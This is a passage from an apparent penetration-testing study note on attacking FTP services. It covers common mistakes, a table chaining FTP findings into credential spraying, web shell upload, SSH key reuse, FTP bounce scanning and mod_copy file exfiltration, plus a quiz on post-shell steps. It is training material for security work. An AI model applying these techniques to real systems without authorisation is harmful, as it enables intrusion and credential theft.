  - **Jumping to brute force too early** — always exhaust anonymous access, default creds, and credential reuse first. Brute force is slow, noisy, and often gets you banned.
  - **Not spraying FTP credentials elsewhere** — FTP credentials found in config files or through login must be tried against SSH, SMB, WinRM, RDP, and databases immediately.
  - **Not checking write access** — always `put test.txt` to verify write permissions. Missing writable anonymous access on a web root is the difference between an informational finding and RCE.
  - **Ignoring TFTP on UDP 69** — it requires no authentication and is easily missed if you only scan TCP.
  - **Using `--passive` when `--no-passive` is needed** — if `wget -m` hangs, the server is likely behind NAT and passive mode data connections are failing. Toggle the mode.
</Callout>

## Attack Chains / Related Notes

FTP rarely exists in isolation. Every finding on FTP is an input to the next phase of the attack:

| FTP Finding | Next Step |
|-------------|-----------|
| Credentials in config files | Spray against SSH, SMB, WinRM, RDP, databases — [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22), [SMB](/01-Recon-and-Enumeration/Service-Enum/SMB-137,138,139-445(samba)) |
| Writable directory + web root | Upload web shell → RCE → [File-Transfers](/04-Post-Exploitation/File-Transfers) → privesc |
| SSH private key | `chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>` → [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22) |
| System user login works | Try same creds on SSH → proper interactive shell |
| Database dump found | Extract creds → [MySQL-3306](/01-Recon-and-Enumeration/Service-Enum/MySQL-3306) / [MSSQL-1433](/01-Recon-and-Enumeration/Service-Enum/MSSQL-1433) |
| Network device config (TFTP) | Extract SNMP community strings → [SNMP-161,162](/01-Recon-and-Enumeration/Service-Enum/SNMP-161,162), VPN creds, VLAN info |
| FTP bounce confirmed | Port scan internal hosts through FTP server — reveals otherwise unreachable targets |
| ProFTPd mod_copy | Copy sensitive files to web root → exfiltrate via HTTP |
| `.bash_history` or `.env` | Often contain plaintext passwords, API keys, or SSH connection strings |
| WordPress `wp-config.php` | Database credentials → dump users table → crack hashes or spray creds |

- **Came from:** [Nmap scanning / port discovery](/01-Recon-and-Enumeration), network enumeration
- **Leads to:** [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22), [SMB](/01-Recon-and-Enumeration/Service-Enum/SMB-137,138,139-445(samba)), [WinRM](/01-Recon-and-Enumeration/Service-Enum/WINRM-5985,5986), [RDP](/01-Recon-and-Enumeration/Service-Enum/RDP-3389), [File-Transfers](/04-Post-Exploitation/File-Transfers), [MySQL-3306](/01-Recon-and-Enumeration/Service-Enum/MySQL-3306), [MSSQL-1433](/01-Recon-and-Enumeration/Service-Enum/MSSQL-1433)

<Quiz
  question="After getting a shell through FTP (web shell upload or SSH key reuse), what's the immediate next step?"
  options={[
    "Run a full nmap scan of the entire network",
    "Stabilize the shell, transfer enumeration tools, and begin privilege escalation",
    "Delete the web shell to cover your tracks",
    "Start brute forcing other FTP servers on the network"
  ]}
  answer={1}
  explanation="First stabilize the shell (upgrade to full TTY with python3 pty.spawn), then transfer enumeration tools like LinPEAS via File-Transfers. Run situational awareness: whoami, id, hostname, ip a, cat /etc/passwd. Begin privilege escalation before worrying about lateral movement — root access unlocks credential dumps and further pivoting."
/>

<div className="flex flex-wrap gap-2 mb-4">
  <TagPill color="#ef4444">#Penetration Testing</TagPill>
  <TagPill color="#f97316">#Red Team</TagPill>
  <TagPill color="#22c55e">#Certification</TagPill>
  <TagPill color="#fcc629">#Linux</TagPill>
  <TagPill color="#0078d6">#Windows</TagPill>
</div>
